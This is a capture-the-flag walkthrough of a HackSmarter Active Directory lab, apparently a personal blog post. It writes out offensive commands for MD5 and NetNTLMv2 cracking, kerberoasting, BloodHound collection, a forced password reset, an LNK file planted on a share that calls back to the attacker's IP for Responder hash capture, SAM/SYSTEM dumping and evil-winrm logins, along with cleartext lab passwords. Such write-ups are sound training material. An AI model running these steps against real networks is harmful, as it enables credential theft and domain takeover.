---
title: "Building Magic"
date: 2026-01-19
layout: "writeup"
difficulty: "East"
excerpt: "Walkthrough for Building Magic"
os: "Windows"
platform: "HackSmarter"
tags: [Hack Smarter, Windows, Active Directory]
comments: false
---

Building Magic is an easy Windows box focused on Active Directory. We are initially provided with the following list of users and passwords from a "database leak":

```
id    username    full_name    role        password
1    r.widdleton    Ron Widdleton    Intern Builder    c4a21c4d438819d73d24851e7966229c
2    n.bottomsworth    Neville Bottomsworth Plannner    61ee643c5043eadbcdc6c9d1e3ebd298
3    l.layman    Luna Layman    Planner        8960516f904051176cc5ef67869de88f
4    c.smith        Chen Smith    Builder        bbd151e24516a48790b2cd5845e7f148
5    d.thomas    Dean Thomas    Builder        4d14ff3e264f6a9891aa6cea1cfa17cb
6    s.winnigan    Samuel Winnigan    HR Manager    078576a0569f4e0b758aedf650cb6d9a
7    p.jackson    Parvati Jackson    Shift Lead    eada74b2fa7f5e142ac412d767831b54
8    b.builder    Bob Builder    Electrician    dd4137bab3b52b55f99f18b7cd595448
9    t.ren        Theodore Ren    Safety Officer    bfaf794a81438488e57ee3954c27cd75
10    e.macmillan    Ernest Macmillan Surveyor    47d23284395f618bea1959e710bc68ef
```

You are also told to add the following to your /etc/hosts file:

```
buildingmagic.local
dc01.buildingmagic.local
```

Once this was done and the lab was started, I decided to see if any of these hashes could be cracked. I put them into a text file in the username:password format and saved them as creds.txt. Next, I used hash-identifier to attempt to determine what type of hashes these are:

![BuildingMagic1.png](/images/BuildingMagic1.png)

It appears that these are likely MD5 hashes. Let's attempt to crack them with john. First, I saved the hashes in their own file as hashes.txt. Next I ran `john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`

![BuildingMagic3.png](/images/BuildingMagic3.png)

Awesome, it cracked one of the passwords. I am assuming this is for r.widdleton, but let's review the pot file and see what is present there:

![BuildingMagic4.png](/images/BuildingMagic4.png)

After reviewing the credential dump, it is confirmed that this is for the user r.widdleton.

Next, I ran `nmap -A 10.1.156.8 -oA buildingmagic` to see what services were open:

![BuildingMagic5.png](/images/BuildingMagic5.png)

There's multiple potential attack paths, including RDP, WINRM, and SMB. I tried with both RDP and WinRM, and those were both failures. I next tried with SMB, and while connectivity was allowed, it didn't appear that r.widdleton had much access to anything:

![BuildingMagic6.png](/images/BuildingMagic6.png)

Since we have a valid set of user credentials, lets see if we can perform kerberoasting. Let's run `impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.1.156.8 -request`:

![BuildingMagic7.png](/images/BuildingMagic7.png)

Awesome, it appears that **r.haggard** is vulnerable to kerberoasting. Let's save that entire string with the hash in a file named kerb.txt. Next, let's run `john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt` to attempt to crack this user's hash:

![](C:\Users\kbvau\AppData\Roaming\marktext\images\2026-01-19-09-20-18-image.png)

Great! We now have a second set of user credentials. Let's attempt access again with RDP, SMB, and WinRM:

![BuildingMagic8.png](/images/BuildingMagic8.png)

Unfortunately, these all failed. Let's take a different approach and use Bloodhound to try to find a path to Administrator with `bloodhound-python -u 'r.haggard' -p 'rubeushagrid' -d BUILDINGMAGIC.LOCAL -ns 10.1.156.8 -c All`

Once completed, let's import the results into Bloodhound and see what relationships are present. After poking around a bit, I noticed that r.haggard can force change the password for hpotch:

![BuildingMagic9.png](/images/BuildingMagic9.png)

Let's force change this user's password with `net rpc password h.potch 'NewPassword123!' -U "buildingmagic.local/r.haggard%rubeushagrid" -S 10.1.57.200`

Note: I had to come back to this machine at a later time, thus the IP change

I was able to change h.potch's password successfully!

![BuildingMagic10.png](/images/BuildingMagic10.png)

Next, I enumerated smb shares, and it appears that h.potch has read/write access to the File-Share folder:

![BuildingMagic11.png](/images/BuildingMagic11.png)

Next, I connected to the share with `smbclient //10.1.57.200/File-Share -U h.potch%NewPassword123!`. Upon review, there were no files present in this directory:

![BuildingMagic12.png](/images/BuildingMagic12.png)

However, since h.potch has write access, we can likely upload a malicious file for another user to execute. Let's start up responder first with `sudo responder -I tun0 -v`

![BuildingMagic13.png](/images/BuildingMagic13.png)

Next, let's create a LNK file with nxc and upload it to the SMB share with `nxc smb 10.1.57.200 -u 'h.potch' -p 'NewPassword123!' -M slinky -o NAME=information.lnk SERVER=10.200.30.233 SHARES=File-Share`

Note: the SERVER IP is your attacker machine's IP.

![BuildingMagic15.png](/images/BuildingMagic15.png)

After a minute or so, back on the responder tab, you should have received a hash for another user, h.grangon:

![BuildingMagic16.png](/images/BuildingMagic16.png)

Next, I saved this hash string in a file named hermione.txt (as it's apparent that these users are all inspired by Harry Potter characters) and used `john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hermione.txt` to crack her password:

![BuildingMagic17.png](/images/BuildingMagic17.png)

Going back to Bloodhound, we can see that she's a member of the Remote Management Users Group:

![BuildingMagic18.png](/images/BuildingMagic18.png)

This means that she should have acces to WinRM. Let's try to connect with `evil-winrm -i 10.1.57.200 -u h.grangon -p 'magic4ever'`

![BuildingMagic19.png](/images/BuildingMagic19.png)

Success! Let's navigate to her Desktop and see if there's anything useful there.

![BuildingMagic20.png](/images/BuildingMagic20.png)

Awesome, we've uncovered the user flag for this system. Next, I ran `whoami /priv` to see what permissions h.grangon has. She has the **SeBackupPrivilege** which will allow you to dump the NTDS database. I was able to make copies of the local SYSTEM and SAM registry hives and then download them to my local machine to crack.

![BuildingMagic22.png](/images/BuildingMagic22.png)

Next, I ran `impacket-secretsdump -sam SAM.bak -system SYSTEM.bak LOCAL` to dump the local hashes from this system:

![BuildingMagic23.png](/images/BuildingMagic23.png)

Next, I reviewed Bloodhound again to pull the list of Domain Users. The only one left on the list that we haven't compromised is a.flatch:

![BuildingMagic24.png](/images/BuildingMagic24.png)

Let's see if the local admin password is the same as his by attempting to login with evil-WinRM:

![BuildingMagic25.png](/images/BuildingMagic25.png)

Success! Let's navigate to the administrator's desktop since a.flatch is an administrator:

![BuildingMagic26.png](/images/BuildingMagic26.png)

There's the root flag!
